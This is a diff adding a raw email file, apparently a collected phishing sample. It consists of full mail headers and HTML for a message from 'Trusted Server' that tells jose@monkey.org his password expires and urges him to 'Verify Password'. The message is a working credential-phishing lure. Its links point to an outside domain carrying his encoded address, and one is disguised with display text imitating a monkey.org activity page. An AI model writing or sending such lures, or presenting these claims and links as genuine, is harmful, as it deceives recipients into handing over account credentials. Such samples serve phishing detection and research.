@@ -1,0 +1,185 @@
+Return-Path: uk@ticketingorder.com
+Delivered-To: jose@monkey.org
+X-FDA: 81785547102.04.F1D4487
+Received: from mail.ticketingorder.com (mail.ticketingorder.com
+ [172.82.187.10])	by imf14.b.hostedemail.com (Postfix) with ESMTP id
+ 000A960002	for <jose@monkey.org>; Tue, 13 Feb 2024 04:47:29 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;	dkim=pass
+ header.d=ticketingorder.com header.s=dkim header.b=ENfrE4ur;	spf=pass
+ (imf14.b.hostedemail.com: domain of uk@ticketingorder.com designates
+ 172.82.187.10 as permitted sender) smtp.mailfrom=uk@ticketingorder.com;
+	dmarc=pass (policy=none) header.from=ticketingorder.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1707799650;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=Op6dgRKOm0J1WElTxzrILKr/F5KmtwruFYrx4AfojpQ=;
+	b=Pk6EcoScAriPngggaOag4zN9P4sw8e6uUpDOOWciBTQ/OSUsaK6YcLAC67fKp+isf8v1KI
+	a/5twzoM908yTPvi68HCnnHCh9KkqC+Oz6uWgT9LDZjEPIx4LqEEgzdD4OS3mkZls7tGat
+	izPSYxZRsH7e1hCrPrq710ryqu+DhxE=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1707799650; a=rsa-sha256;
+	cv=none;
+	b=pHroVOvm4yJKQ4ozpc+G/79miSv55ZtL72OLzz+Cwp1izRPh5JcCDQGzpmDFwVKQD8W1G6
+	KZpCWJ6VaLwnxP3gtb6ATEImIWWWCGrMIGyMgTaJzC5XOUu5uHRjRD2jnlgelfQdsaL4bA
+	gN0MaqwNzvyavXoCPV5676kwRpqwOk0=
+ARC-Authentication-Results: i=1;	imf14.b.hostedemail.com;	dkim=pass
+ header.d=ticketingorder.com header.s=dkim header.b=ENfrE4ur;	spf=pass
+ (imf14.b.hostedemail.com: domain of uk@ticketingorder.com designates
+ 172.82.187.10 as permitted sender) smtp.mailfrom=uk@ticketingorder.com;
+	dmarc=pass (policy=none) header.from=ticketingorder.com
+Received: from mail.ticketingorder.com (localhost [127.0.0.1])
+	by mail.ticketingorder.com (Postfix) with ESMTP id 4TYnbk33c6z2JTc
+	for <jose@monkey.org>; Mon, 12 Feb 2024 22:57:54 -0500 (EST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=
+	ticketingorder.com; h=content-transfer-encoding:content-type
+	:content-type:mime-version:message-id:date:date:subject:subject
+	:to:from:from; s=dkim; t=1707796673; x=1710388674; bh=ERUWGDdjw6
+	cV16paxLgNue1JD46U3UVgPKnrRy7xmNQ=; b=ENfrE4urhH3/UmMkXNv646B9Uj
+	aI2PyO67HY/f5vPSLrRUblhEJDI7RZM00EAA7GwU/jregqJ6wd6PlYF2FkEFaO0w
+	aWmbXV4CODOA0r+wb8oWF/uGD8AIp7lFmHEhuPu7eOw6nD3FWmQdoq6sBgy8zq80
+	4oLID+yiZq7O2fEQ0=
+X-Virus-Scanned: amavisd-new at mail.ticketingorder.com
+Received: from mail.ticketingorder.com ([127.0.0.1])	by
+ mail.ticketingorder.com (mail.ticketingorder.com [127.0.0.1]) (amavisd-new,
+ port 10026)	with ESMTP id aH3LmKn2xzDF for <jose@monkey.org>;	Mon, 12 Feb
+ 2024 22:57:53 -0500 (EST)
+Received: from ticketingorder.com (unknown [45.133.174.55])
+	by mail.ticketingorder.com (Postfix) with ESMTPSA id 4TYksw3FMHz2s1w
+	for <jose@monkey.org>; Mon, 12 Feb 2024 20:54:59 -0500 (EST)
+From: "Trusted Server" <uk@ticketingorder.com>
+To: jose@monkey.org
+Subject: - IMPORTANT:  - Retain Credentials
+Date: 13 Feb 2024 02:54:58 +0100
+Message-ID: <20240213025458.C271B8711C3A71E3@ticketingorder.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 000A960002
+X-Stat-Signature: 91zbt91ugcespx6w8xict46gbcat7oqj
+X-Spam-Status: No, score=1.80
+X-Rspam-User: 
+X-HE-Tag: 1707799649-354512
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/8t+A4ujORVWrRUVdRx9jO/b7yjxR8G6NSBBYn/nC0r2u?=
+ =?utf-8?q?oYYYWzAnU6atv/MzMsTDHE+RJ+JZghtE8G5I1p9XkayMGjq6BD7Xf1iTR4PfmU+A7?=
+ =?utf-8?q?D+v/iGGQ3ygmtRQ0yKtVCiuSUs+/fhFyVIp4WIKXdxyJisz1UR2CUAkyWL5NTCzeo?=
+ =?utf-8?q?t+Qb+vBQreyZ5BYaQlu+Xojk4QvUF4kUaIJ5Ji3FQ8tdXMe5NhlL1R1SJ0HjqEipo?=
+ =?utf-8?q?dvPYwghhpCBLI8hDC6KzWnSqX1aj8uFmwRwH5/3UI/B2RWUsUx/gZ3cl+ANtCjJ7u?=
+ =?utf-8?q?5SnSQt53rTalHXA9h6s8huwMBsFavlR+KHYb8gdw/ix+suO6MSyQVg+jdKuavmYBa?=
+ =?utf-8?q?dn61tar290648VP+ICLqU0XY2A=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 53
+
+<html><head>
+
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
+252"><meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"font-family: Arial, sans-serif;">
+<span style=3D"color: rgb(32, 31, 30); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Calibri, sans-serif, serif, EmojiF=
+ont; font-size: 16px; font-style: normal; font-weight: 400; word-spacing: 0=
+px; float: none; display: inline !important; white-space: normal; orphans: =
+2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-style: initial; text-decoration-color:=20
+initial;"></span>
+<div class=3D"rcmBody">
+<div style=3D'border-width: 0px; margin: 0px 0px 0px 18px; padding: 5px 5px=
+ 5px 0px; border-image: none; width: 477px; color: rgb(32, 31, 30); text-tr=
+ansform: none; text-indent: 0px; letter-spacing: normal; font-family: wf_se=
+goe-ui_semibold, "Segoe UI Semibold", "Segoe WP Semibold", "Segoe UI", "Seg=
+oe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; font-size: 15px; font-=
+style: normal; font-weight: normal; text-decoration: none; word-spacing: 0p=
+x; vertical-align: baseline; float: left;=20
+white-space: normal; font-stretch: inherit; font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; font-variant-nu=
+meric: inherit; font-variant-east-asian: inherit; -webkit-text-size-adjust:=
+ auto;'>
+<div style=3D'border-width: 0px; margin: 0px; padding: 5px 0px 5px 3px; bor=
+der-image: none; font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", T=
+ahoma, Arial, sans-serif, serif, EmojiFont; font-size: 13px; vertical-align=
+: baseline; font-stretch: inherit; background-color: rgb(244, 248, 245); fo=
+nt-variant-ligatures: inherit; font-variant-caps: inherit; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit;'>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; border-image: =
+none; font-family: inherit; vertical-align: baseline; font-stretch: inherit=
+; font-variant-caps: inherit;">Mes<wbr>sage from Trusted server.</span></di=
+v></div>
+<div style=3D'border-width: 0px; margin: 0px; padding: 0px; border-image: n=
+one; color: rgb(32, 31, 30); text-transform: none; text-indent: 0px; letter=
+-spacing: normal; font-family: wf_segoe-ui_semibold, "Segoe UI Semibold", "=
+Segoe WP Semibold", "Segoe UI", "Segoe WP", Tahoma, Arial, sans-serif, seri=
+f, EmojiFont; font-size: 15px; font-style: normal; font-weight: normal; tex=
+t-decoration: none; word-spacing: 0px; vertical-align: baseline; white-spac=
+e: normal; font-stretch: inherit;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; font-variant-numeric: inherit; font-variant-east-asian: inh=
+erit; -webkit-text-size-adjust: auto;'>
+<div style=3D"border-width: 0px; margin: 0px; padding: 2px; border-image: n=
+one; width: 5px; height: 30px; font-family: inherit; vertical-align: baseli=
+ne; font-stretch: inherit; background-color: rgb(86, 166, 89); font-variant=
+-caps: inherit;"></div>
+<div style=3D"border-width: 0px; margin: 0px; padding: 20px; border-image: =
+none; font-family: Calibri, sans-serif, serif, EmojiFont; font-size: 16px; =
+vertical-align: baseline; font-stretch: inherit; font-variant-ligatures: in=
+herit; font-variant-caps: inherit; font-variant-numeric: inherit; font-vari=
+ant-east-asian: inherit; font-variant-alternates: inherit;">
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; border-image: n=
+one; font-family: inherit; vertical-align: baseline; font-stretch: inherit;=
+ font-variant-caps: inherit;"><span>
+<p><br></p></span></div></div></div></div>
+=20=20
+  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
+1">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+
+
+<div style=3D"margin: 0px auto; padding: 50px; max-width: 600px; background=
+-color: rgb(246, 246, 246);">
+    <table width=3D"100%" style=3D"margin: 0px auto; width: 100%; border-co=
+llapse: collapse; max-width: 600px;" border=3D"0" cellspacing=3D"0" cellpad=
+ding=3D"0">
+        <tbody><tr>
+          <td>
+            <h2>Keep the same password!</h2>
+            <p style=3D"font-weight: 500;">Valued jose,</p>
+            <p>The password to your email account jose@monkey.org will expi=
+re on 2/13/2024 2:54:58 a.m..</p>
+            <p>Kindly verify below to keep using the same password</p>
+    </td>
+    </tr>
+    <tr>
+    <td style=3D"padding: 10px 0px;">
+    <a style=3D"padding: 12px 24px; border-radius: 4px; color: rgb(255, 255=
+, 255); text-decoration: none; display: inline-block; background-color: rgb=
+(0, 119, 204);" href=3D"https://hereisrandomizerinterlude.michanpyon.com/?e=
+mail=3Dam9zZUBtb25rZXkub3Jn" target=3D"_blank">Verify Password</a>
+    </td>
+    </tr>
+    <tr>
+    <td style=3D"padding: 10px 0px;">
+    <p>You may visit <a href=3D"https://hereisrandomizerinterlude.michanpyo=
+n.com/?email=3Dam9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noopener nore=
+ferrer">monkey.org/jose@monkey.org/activity</a> to see email activity.</p>
+    </td>
+    </tr>
+    <tr>
+    <td style=3D"padding: 10px 0px;">
+    <p style=3D"font-weight: 500;">&copy; 2024 All monkey.org rights reserv=
+ed</p>
+    </td>
+    </tr>
+=20=20=20=20
+      </tbody></table>
+</div>
+
+</body></html>
+
